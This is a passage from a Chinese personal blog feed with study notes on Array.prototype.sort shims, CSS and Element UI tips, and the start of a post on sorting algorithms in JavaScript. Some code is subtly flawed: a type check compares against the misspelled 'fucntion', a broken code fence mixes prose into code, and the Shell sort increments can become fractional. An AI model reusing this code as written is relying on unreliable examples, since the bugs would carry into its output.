id="Array-prototype-sort-兼容"><a href="#Array-prototype-sort-兼容" class="headerlink" title="Array.prototype.sort 兼容"></a>Array.prototype.sort 兼容</h3><p>IE9– Array.prototype.sort 不能根据 对象属性 做排序的遗憾<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方法1冒泡排序</span></span><br><span class="line"><span class="keyword">var</span> mySort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fn != <span class="string">'function'</span>)&#123;</span><br><span class="line">        fn = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="keyword">this</span>.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=i+<span class="number">1</span>;j&lt;<span class="keyword">this</span>.length;j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">this</span>[i];</span><br><span class="line">            <span class="keyword">if</span>(fn(<span class="keyword">this</span>[i],<span class="keyword">this</span>[j]) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">this</span>[i] = <span class="keyword">this</span>[j];</span><br><span class="line">                <span class="keyword">this</span>[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.prototype.sorts!= <span class="string">'fucntion'</span>)&#123;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.sorts = mySort;</span><br><span class="line">    mySort = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法2 插入排序</span></span><br><span class="line"><span class="keyword">var</span> mySort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fn != <span class="string">'function'</span>)&#123;</span><br><span class="line">        fn = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a-b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="keyword">this</span>.length;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> t = <span class="keyword">this</span>[i];</span><br><span class="line">        <span class="keyword">var</span> j = i<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &gt;= <span class="number">0</span> &amp;&amp; fn(<span class="keyword">this</span>[j],t)&gt; <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">this</span>[j+<span class="number">1</span>] = <span class="keyword">this</span>[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>[j+<span class="number">1</span>] = t;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.prototype.sorts!= <span class="string">'fucntion'</span>)&#123;</span><br><span class="line">    <span class="built_in">Array</span>.prototype.sorts = mySort;</span><br><span class="line">    mySort = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>safari 不支持函数参数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">window</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> ua = <span class="built_in">window</span>.navigator.userAgent.toLowerCase(), </span><br><span class="line">    reg = <span class="regexp">/msie|applewebkit.+safari/</span>; </span><br><span class="line">    <span class="keyword">if</span>(reg.test(ua))&#123; </span><br><span class="line">        <span class="keyword">var</span> _sort = <span class="built_in">Array</span>.prototype.sort; </span><br><span class="line">        <span class="built_in">Array</span>.prototype.sort = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>)</span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(!!fn &amp;&amp; <span class="keyword">typeof</span> fn === <span class="string">'function'</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>.length &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">this</span>; </span><br><span class="line">                <span class="keyword">var</span> i = <span class="number">0</span>, j = i + <span class="number">1</span>, l = <span class="keyword">this</span>.length, tmp, r = <span class="literal">false</span>, t = <span class="number">0</span>; </span><br><span class="line">                <span class="keyword">for</span>(; i &lt; l; i++)&#123; </span><br><span class="line">                    <span class="keyword">for</span>(j = i + <span class="number">1</span>; j &lt; l; j++)&#123; </span><br><span class="line">                        t = fn.call(<span class="keyword">this</span>, <span class="keyword">this</span>[i], <span class="keyword">this</span>[j]); </span><br><span class="line">                        r = (<span class="keyword">typeof</span> t === <span class="string">'number'</span> ? t : </span><br><span class="line">                        !!t ? <span class="number">1</span> : <span class="number">0</span>) &gt; <span class="number">0</span> </span><br><span class="line">                        ? <span class="literal">true</span> : <span class="literal">false</span>; </span><br><span class="line">                        <span class="keyword">if</span>(r)&#123; </span><br><span class="line">                            tmp = <span class="keyword">this</span>[i]; </span><br><span class="line">                            <span class="keyword">this</span>[i] = <span class="keyword">this</span>[j]; </span><br><span class="line">                            <span class="keyword">this</span>[j] = tmp; </span><br><span class="line">                        &#125; </span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> _sort.call(<span class="keyword">this</span>); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></p><p><a href="https://blog.csdn.net/lt3487928/article/details/53157817" target="_blank" rel="noopener">https://blog.csdn.net/lt3487928/article/details/53157817</a></p><p><a href="https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html" target="_blank" rel="noopener">https://www.cnblogs.com/Alucelx/archive/2011/07/13/2104381.html</a></p><h3 id="height设为100-要求父容器高度确定，否则无效。"><a href="#height设为100-要求父容器高度确定，否则无效。" class="headerlink" title="height设为100%要求父容器高度确定，否则无效。"></a>height设为100%要求父容器高度确定，否则无效。</h3><h3 id="el-scrollbar滚动到容器底部"><a href="#el-scrollbar滚动到容器底部" class="headerlink" title="el-scrollbar滚动到容器底部"></a>el-scrollbar滚动到容器底部</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-scrollbar style=&quot;height:100%&quot; ref=&quot;elscrollbar&quot;&gt;</span><br><span class="line">var div = this.$refs[&apos;elscrollbar&apos;].$refs[&apos;wrap&apos;];</span><br><span class="line">this.$nextTick(() =&gt; &#123;</span><br><span class="line">    div.scrollTop = div.scrollHeight</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="怎么应用vertical-align，才能生效？"><a href="#怎么应用vertical-align，才能生效？" class="headerlink" title="怎么应用vertical-align，才能生效？"></a>怎么应用vertical-align，才能生效？</h3><p><a href="https://blog.csdn.net/diudiu5201/article/details/54666809" target="_blank" rel="noopener">怎么应用vertical-align，才能生效</a></p><ol><li><p>父元素（inline-block\block）必须含有line-height（inline元素有无皆可），子元素（inline-block/inline元素）中的vertical-align才能起作用。<br>vertical-align不可继承，必须对子元素单独设置。</p></li><li><p>当父元素没有设置line-height时，vertical-align只对行内元素的兄弟元素对齐有用，无法子元素居中对齐父元素。<br>设置了vertical-align:middle的子元素的中线与兄弟元素的基线对齐。若兄弟元素都设置该项，则居中对齐。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;await-async最佳实践&quot;&gt;&lt;a href=&quot;#await-async最佳实践&quot; class=&quot;headerlink&quot; title=&quot;await/async最佳实践&quot;&gt;&lt;/a&gt;await/async最佳实践&lt;/h3&gt;&lt;h4 id=&quot;第一个例子&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="每月总结" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%AF%8F%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>八大排序算法、KMP</title>
    <link href="http://lry1994.github.io/study/Comprehensive/8-sort.html"/>
    <id>http://lry1994.github.io/study/Comprehensive/8-sort.html</id>
    <published>2018-05-04T16:00:00.000Z</published>
    <updated>2018-10-08T06:50:28.780Z</updated>
    
    <content type="html"><![CDATA[<p> &lt;%asset_img 8-sort.png%&gt;</p><p>当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。</p><p>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；</p><h2 id="插入排序—直接插入排序-Straight-Insertion-Sort"><a href="#插入排序—直接插入排序-Straight-Insertion-Sort" class="headerlink" title="插入排序—直接插入排序(Straight Insertion Sort)"></a>插入排序—直接插入排序(Straight Insertion Sort)</h2><p>时间复杂度：O（n^2）稳定</p><h4 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想:"></a>基本思想:</h4><p>每个元素向前找到属于自己的位置，后面元素后移.</p><p>将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的&gt;有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第&gt;2个记录逐个进行插入，直至整个序列有序为止。</p><p>要点：设立哨兵，作为临时存储和判断数组边界之用。</p><p>直接插入排序示例：<br> &lt;%asset_img insert_sort.png%&gt;</p><p>如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是<code>稳定</code>的。</p><h4 id="算法的实现："><a href="#算法的实现：" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InsertSort</span>(<span class="params">a</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i= <span class="number">1</span>; i&lt;a.length; i++)&#123; </span><br><span class="line">    <span class="keyword">if</span>(a[i] &lt; a[i<span class="number">-1</span>])&#123; <span class="comment">//若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入  </span></span><br><span class="line">        <span class="keyword">let</span> x = a[i]; <span class="comment">//复制为哨兵，即存储待排序元素 </span></span><br><span class="line">        a[i] = a[i<span class="number">-1</span>]; <span class="comment">//先后移一个元素 </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> j= i<span class="number">-1</span>; </span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;x &lt; a[j])&#123; <span class="comment">//查找在有序表的插入位置 </span></span><br><span class="line">            a[j+<span class="number">1</span>] = a[j]; </span><br><span class="line">            j--; <span class="comment">//元素后移 ,这里减多了一次</span></span><br><span class="line">        &#125; </span><br><span class="line">        a[j+<span class="number">1</span>] = x; <span class="comment">//插入到正确位置 ,记得j+1</span></span><br><span class="line">    &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">a=[<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>]</span><br><span class="line">InsertSort(a) </span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">其他的插入排序有二分插入排序，2-路插入排序。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 插入排序—希尔排序（Shell`</span>s Sort）</span><br><span class="line"></span><br><span class="line">希尔排序是<span class="number">1959</span> 年由D.L.Shell 提出来的，相对直接排序有较大的改进。希尔排序又叫缩小增量排序</span><br><span class="line"></span><br><span class="line">#### 基本思想：</span><br><span class="line">    先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</span><br><span class="line"></span><br><span class="line">#### 操作方法：</span><br><span class="line">    <span class="number">1.</span>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=<span class="number">1</span>；</span><br><span class="line">    <span class="number">2.</span>按增量序列个数k，对序列进行k 趟排序；</span><br><span class="line">    <span class="number">3.</span>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为<span class="number">1</span> 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</span><br><span class="line"></span><br><span class="line">希尔排序的示例：</span><br><span class="line"> &lt;%asset_img shell_sort.png%&gt;</span><br><span class="line"></span><br><span class="line">#### 算法实现：</span><br><span class="line"></span><br><span class="line">    我们简单处理增量序列：增量序列d = &#123;n/<span class="number">2</span> ,n/<span class="number">4</span>, n/<span class="number">8</span> ....<span class="number">.1</span>&#125; n为要排序数的个数</span><br><span class="line"></span><br><span class="line">    即：先将要排序的一组记录按某个增量d（n/<span class="number">2</span>,n为要排序数的个数）分成若干组子序列，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/<span class="number">2</span>）对它进行分组，在每组中再进行直接插入排序。继续不断缩小增量直至为<span class="number">1</span>，最后使用直接插入排序完成排序。</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function ShellInsertSort(a, dk) </span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">for(let i= dk; i&lt;a.length; ++i)&#123; </span></span><br><span class="line"><span class="string">    if(a[i] &lt; a[i-dk])&#123; //若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入 </span></span><br><span class="line"><span class="string">        let j = i-dk; </span></span><br><span class="line"><span class="string">        let x = a[i]; //复制为哨兵，即存储待排序元素 </span></span><br><span class="line"><span class="string">        a[i] = a[i-dk]; //首先后移一个元素 </span></span><br><span class="line"><span class="string">        while(x &lt; a[j])&#123; //查找在有序表的插入位置 </span></span><br><span class="line"><span class="string">            a[j+dk] = a[j]; </span></span><br><span class="line"><span class="string">            j -= dk; //元素后移 </span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">        a[j+dk] = x; //插入到正确位置 </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">function shellSort(a)&#123; </span></span><br><span class="line"><span class="string">    let len = a.length;</span></span><br><span class="line"><span class="string">    let dk = len/2; </span></span><br><span class="line"><span class="string">    while( dk &gt;= 1 )&#123; </span></span><br><span class="line"><span class="string">        ShellInsertSort(a, dk); </span></span><br><span class="line"><span class="string">        dk = dk/2; </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> a= [3,1,5,7,2,4,9,6]; </span></span><br><span class="line"><span class="string">//ShellInsertSort(a,8,1); //直接插入排序 </span></span><br><span class="line"><span class="string">shellSort(a,8); //希尔插入排序</span></span><br></pre></td></tr></table></figure><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>希尔排序时效分析很难，关键码的比较次数与记录移动次数依赖于增量因子序列d的选取，特定情况下可以准确估算出关键码的比较次数和记录的移动次数。目前还没有人给出选取最好的增量因子序列的方法。增量因子序列可以有各种取法，有取奇数的，也有取质数的，但需要注意：增量因子中除1 外没有公因子，且最后一个增量因子必须为1。希尔排序方法是一个不稳定的排序方法。</p><h2 id="选择排序—简单选择排序（Simple-Selection-Sort）"><a href="#选择排序—简单选择排序（Simple-Selection-Sort）" class="headerlink" title="选择排序—简单选择排序（Simple Selection Sort）"></a>选择排序—简单选择排序（Simple Selection Sort）</h2><h4 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h4><pre><code>在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</code></pre><p>简单选择排序的示例：<br>&lt;%asset_img select_sort.png%&gt;</p><h4 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h4><pre><code>第一趟，从n 个记录中找出关键码最小的记录与第一个记录交换；第二趟，从第二个记录开始的n-1 个记录中再选出关键码最小的记录与第二个记录交换；以此类推.....第i 趟，则从第i 个记录开始的n-i+1 个记录中选出关键码最小的记录与第i 个记录交换，直到整个序列按关键码有序。</code></pre><h4 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelectMinKey</span>(<span class="params">a,start</span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">let</span> k = start; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j=start+<span class="number">1</span> ;j&lt;a.length; ++j) &#123; </span><br><span class="line">    <span class="keyword">if</span>(a[k] &gt; a[j]) k = j; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> k; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span>(<span class="params">a</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">let</span> key, tmp; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt; a.length; ++i) &#123; </span><br><span class="line">        key = SelectMinKey(a,i); <span class="comment">//选择最小的元素 </span></span><br><span class="line">        <span class="keyword">if</span>(key != i)&#123; </span><br><span class="line">        tmp = a[i]; a[i] = a[key]; a[key] = tmp; <span class="comment">//最小元素与第i位置元素互换 </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">a = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>]; </span><br><span class="line">selectSort(a, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>简单选择排序的改进——<code>二元选择排序</code></p><p>简单选择排序，每趟循环只能确定一个元素排序后的定位。我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n/2]趟循环即可。具体实现如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> SelectSort(int r[],int n) &#123; </span><br><span class="line">int i ,j , min ,max, tmp; </span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">1</span> ;i &lt;= n/<span class="number">2</span>;i++) &#123; </span><br><span class="line"><span class="comment">// 做不超过n/2趟选择排序 </span></span><br><span class="line">    min = i; max = i ; <span class="comment">//分别记录最大和最小关键字记录位置 </span></span><br><span class="line">    <span class="keyword">for</span> (j= i+<span class="number">1</span>; j&lt;= n-i; j++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (r[j] &gt; r[max]) &#123; </span><br><span class="line">            max = j ; <span class="keyword">continue</span> ; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (r[j]&lt; r[min]) &#123; </span><br><span class="line">            min = j ; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//该交换操作还可分情况讨论以提高效率 </span></span><br><span class="line">    tmp = r[i<span class="number">-1</span>]; r[i<span class="number">-1</span>] = r[min]; r[min] = tmp; </span><br><span class="line">    tmp = r[n-i]; r[n-i] = r[max]; r[max] = tmp; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="选择排序—堆排序（Heap-Sort）"><a href="#选择排序—堆排序（Heap-Sort）" class="headerlink" title="选择排序—堆排序（Heap Sort）"></a>选择排序—堆排序（Heap Sort）</h2><p>堆排序是一种树形选择排序，是对直接选择排序的有效改进。</p><h4 id="基本思想：-1"><a href="#基本思想：-1" class="headerlink" title="基本思想："></a>基本思想：</h4><p>堆排序的基本思想是：将待排序序列构造成一个<strong>大顶堆</strong>，此时，整个序列的最大值就是堆顶的根节点。<strong>将其与末尾元素进行交换，此时末尾就为最大值</strong>。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</p><p>因此，实现堆排序需解决两个问题：</p><ol><li>建堆。 如何将n 个待排序的数建成堆；</li><li>调整堆。输出堆顶元素后，怎样调整剩余n-1 个元素，使其成为一个新堆。</li></ol><p>首先讨论第二个问题：输出堆顶元素后，对剩余n-1元素重新建成堆的调整过程。</p><h4 id="调整小顶堆的方法："><a href="#调整小顶堆的方法：" class="headerlink" title="调整小顶堆的方法："></a>调整小顶堆的方法：</h4><p>1）设有m 个元素的堆，输出堆顶元素后，剩下m-1 个元素。将堆底元素送入堆顶（（最后一个元素与堆顶进行交换），堆被破坏，其原因仅是根结点不满足堆的性质。</p><p>2）将根结点与左、右子树中<code>**较小**</code>元素的进行交换。</p><p>3）若与左子树交换：如果左子树堆被破坏，即左子树的根结点不满足堆的性质，则重复方法 （2）.</p><p>4）若与右子树交换，如果右子树堆被破坏，即右子树的根结点不满足堆的性质。则重复方法 （2）.</p><p>5）继续对不满足堆性质的子树进行上述交换操作，直到叶子结点，堆被建成。</p><p>称这个自根结点到叶子结点的调整过程为筛选。如图：<br>&lt;%asset_img heap_sort_1.png%&gt;</p><p>再讨论对n 个元素初始建堆的过程。</p><h4 id="建堆方法："><a href="#建堆方法：" class="headerlink" title="建堆方法："></a>建堆方法：</h4><p>对初始序列建堆的过程，就是一个反复进行筛选的过程。</p><p>1）n 个结点的完全二叉树，则最后一个结点是第 <code>floor(n-2)</code>个结点的子树。</p><p>2）筛选从第<code>floor(n-2)</code>个结点为根的子树开始，该子树成为堆。</p><p>3）之后向前依次对各结点为根的子树进行筛选，使之成为堆，直到根结点。</p><p>如图建堆初始过程：无序序列：（49，38，65，97，76，13，27，49）<br> &lt;%asset_img heap_sort_2.png%&gt;</p><h4 id="算法的实现：-1"><a href="#算法的实现：-1" class="headerlink" title="算法的实现："></a>算法的实现：</h4><p>从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 排序思路：（升序）</span></span><br><span class="line"><span class="comment"> * 将堆根保存于尾部，并对剩余序列调用调整函数，调整完成后，再将最大跟保存于尾部-1（-1，-2，...，-i），</span></span><br><span class="line"><span class="comment"> * 再对剩余序列进行调整，反复进行该过程，直至排序完成。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span 